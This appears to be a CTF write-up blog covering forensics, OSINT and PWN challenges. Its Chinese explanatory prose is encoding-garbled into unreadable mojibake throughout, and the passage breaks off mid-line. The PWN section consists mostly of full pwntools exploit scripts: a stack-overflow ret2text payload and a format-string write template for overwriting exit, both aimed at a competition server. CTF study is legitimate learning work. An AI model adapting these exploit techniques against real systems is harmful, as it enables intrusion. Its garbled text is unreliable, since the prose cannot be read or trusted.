<p>ç„¶åæ ¹æ®æç¤ºæ‰¾minetestï¼Œå‘ç°æ˜¯ä¸ªç±»ä¼¼äºMinecraftçš„æ¸¸æˆå¼•æ“ï¼ˆï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/minetest/minetest">https://github.com/minetest/minetest</a></p>
<p>ç„¶åç¿»äº†ä¸‹ç›®å½•ï¼Œå‘ç°uilt/wiresharké‡Œé¢æœ‰ä¸ªminetest.luaè„šæœ¬ï¼Œç„¶åæ ¹æ®ä½œè€…çš„tableï¼Œå‘ç°ç¬¬äºŒéƒ¨åˆ†æ˜¯å®¢æˆ·ç«¯çš„æŒ‡ä»¤è§£æ</p>
<p><img src="https://s2.loli.net/2023/09/11/n8KS6uCbzwkIQHc.png" alt=""></p>
<p>å…ˆç”­ç®¡è¿™ä¹ˆå¤šï¼Œå…ˆæŠŠè¿™ä¸ªluaæ”¾åˆ°wiresharkæ’ä»¶ç›®å½•ä¸‹é¢ï¼Œå°è¯•è§£æä¸‹æµé‡ï¼Œç»“æœèƒ½è¯†åˆ«ç‰¹å®šçš„åè®®å’Œå­—æ®µäº†</p>
<p><img src="https://s2.loli.net/2023/09/11/4Rue79QMLDVZpSk.png" alt=""></p>
<p>ç„¶åå»çœ‹ä»–å®¢æˆ·ç«¯çš„æµé‡å­—æ®µçš„è§£æè§„åˆ™ï¼Œå‘ç°å¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/11/w3vWCVPkhtDG9Ts.png" alt=""></p>
<p>ç„¶åå‘ç°è¿™ä¸ªåœ°æ–¹ç»™å‡ºäº†ç”¨æˆ·ç§»åŠ¨çš„æ•°æ®ï¼Œå°è¯•æŠŠpcapngæ•°æ®åŒ…å¯¼å‡ºä¸ºjsonï¼Œç„¶åå†™ä¸ªè„šæœ¬æå–å‡ºæ‰€æœ‰çš„å®¢æˆ·ç«¯çš„è§’è‰²çš„ç§»åŠ¨æ•°æ®ï¼ˆxï¼Œyï¼Œzï¼‰</p>
<p>å‘ç°yæ˜¯ä¸ªå®šå€¼1500ï¼Œæ‰€ä»¥æå–å‡ºæ‰€æœ‰çš„ï¼ˆxï¼Œzï¼‰ï¼Œå°è¯•ç»˜åˆ¶æ•£ç‚¹å›¾ï¼Œæœ€ç»ˆè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.animation <span class="keyword">import</span> FuncAnimation</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;data.json&#x27;</span></span><br><span class="line"></span><br><span class="line">json_data_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_data_list = json.load(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">coordinates = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> json_data <span class="keyword">in</span> json_data_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        playerpos_x = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_x&quot;</span>]</span><br><span class="line">        playerpos_y = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_y&quot;</span>]</span><br><span class="line">        playerpos_z = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_z&quot;</span>]</span><br><span class="line"></span><br><span class="line">        coordinates.append(&#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: playerpos_x,</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: playerpos_y,</span><br><span class="line">            <span class="string">&quot;z&quot;</span>: playerpos_z</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># print(coordinates)</span></span><br><span class="line"></span><br><span class="line">x_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;x&#x27;</span>] * <span class="number">10</span>) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]	<span class="comment"># æ”¾å¤§xçš„å€¼ï¼Œè¦ä¸ç„¶å›¾ä¼šæŒ¤åœ¨ä¸€èµ·</span></span><br><span class="line">z_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;z&#x27;</span>]) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]</span><br><span class="line"></span><br><span class="line">plt.scatter(x_values, z_values, marker=<span class="string">&#x27;o&#x27;</span>, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/11/hszevpHMWa9oNLD.png" alt=""></p>
<h2 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h2><p>ç»™äº†ä¸ªwordæ–‡æ¡£ï¼Œé‡Œé¢åµŒå…¥VBAå®ä»£ç äº†ï¼Œæ‰¾åˆ°wordçš„å¼€å‘å·¥å…·æ‰“å¼€ï¼Œflagå°±åœ¨x49å˜é‡é‡Œé¢</p>
<p><img src="https://s2.loli.net/2023/09/11/4KVEGexpBJCoTzA.png" alt=""></p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Rouge-Access-Point"><a href="#Rouge-Access-Point" class="headerlink" title="Rouge Access Point"></a>Rouge Access Point</h2><blockquote>
<p>Weâ€™ve received a notice from our companies EDR software that a laptop was attacked while they were on WFH. The employee says they were at home when it happened, but we suspect they were using public wifi. Our EDR software managed to capture the BSSID of the wifi (<strong>46:D1:FA:63:BC:66</strong>) network before it got disconnected, but not the SSID. Can you still find the network they were connected to?</p>
</blockquote>
<p>ç»™äº†bssidï¼Œå°è¯•æ‰¾ssidï¼Œwigleæ•°æ®åº“ä¸€æŸ¥å°±æŸ¥å‡ºæ¥äº†</p>
<p><a target="_blank" rel="noopener" href="https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66">https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66</a></p>
<p><img src="https://s2.loli.net/2023/09/11/MWuLabS6T24vZ5h.png" alt=""></p>
<h2 id="Satellite-Killerï¼ˆå¥½æ´»ï¼‰"><a href="#Satellite-Killerï¼ˆå¥½æ´»ï¼‰" class="headerlink" title="Satellite Killerï¼ˆå¥½æ´»ï¼‰"></a>Satellite Killerï¼ˆå¥½æ´»ï¼‰</h2><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p><strong>Easy</strong></p>
<p>Most satellites get to live out a relatively peaceful existence in space until their orbit eventually decays and they fall back to Earth.</p>
<p>Most.</p>
<p>Back in the 80â€™s, one poor satellite met a premature end at the hands of an ASM-135.</p>
<p>I would like you to find the date that the second-to-last piece of its debris fell back down to Earth (Or more realistically, its decay date).</p>
<p>In addition, please give me its object ID/International Code.</p>
<p><em>Flag format: PCTF{OBJECTID_YEAR-MONTH-DAY} </em></p>
<p><em>For example, for a piece of debris from the Falcon 9, the flag would look like this: PCTF{2023-028BG_2023-3-15}</em></p>
</blockquote>
<p>å°è¯•æ‰¾ä¸€é¢—å«æ˜Ÿçš„å€’æ•°ç¬¬äºŒç¢ç‰‡çš„å è½æ—¶é—´å’Œç¼–å·ï¼Œé¦–å…ˆåœ¨ç»´åŸºä¸Šæ‰¾åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Solwind">https://en.wikipedia.org/wiki/Solwind</a></p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8">https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8</a></p>
<p>ç„¶åç»™å‡ºäº†æœ€åä¸€å—ç¢ç‰‡çš„å è½æ—¶é—´ï¼Œå»æŸ¥ç»´åŸºç™¾ç§‘ç›¸å…³å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå«æ˜Ÿæ•°æ®åº“ï¼Œ<a target="_blank" rel="noopener" href="https://www.space-track.org/ã€‚">https://www.space-track.org/ã€‚</a></p>
<p><img src="https://s2.loli.net/2023/09/11/843XoUJmydeLuVY.png" alt=""></p>
<p>è¿™ä¸ªwebç½‘ç«™æä¾›äº†è°ƒç”¨çš„ç›¸å…³APIï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç¿»å‡ é¡µï¼Œå°±èƒ½æ‰¾åˆ°å¯¹åº”çš„æ•°æ®ï¼š<a target="_blank" rel="noopener" href="https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show">https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show</a></p>
<p><img src="https://s2.loli.net/2023/09/11/Ydk5RyFOLowlCGb.png" alt=""></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>æ²¡å’‹åšï¼Œéš¾çš„ä¸ä¼šï¼Œç®€å•çš„åˆå¤ªç®€å•</p>
<h2 id="guessinggame"><a href="#guessinggame" class="headerlink" title="guessinggame"></a>guessinggame</h2><p><img src="https://s2.loli.net/2023/09/11/rQ9ChceSXJxKg4E.png" alt=""></p>
<p>ç®€å•æ ˆæº¢å‡ºï¼Œret2text</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./guessinggame&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./guessinggame&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">    payload = (<span class="number">0x130</span> - <span class="number">0x4</span>) * <span class="string">&#x27;a&#x27;</span> + p32(<span class="number">1</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="printshop"><a href="#printshop" class="headerlink" title="printshop"></a>printshop</h2><p>ç®€å•çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåªéœ€è¦æŠŠexitæ”¹ä¸ºåé—¨å‡½æ•°åœ°å€å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./printshop&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">7997</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./printshop&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">		low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">		location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span 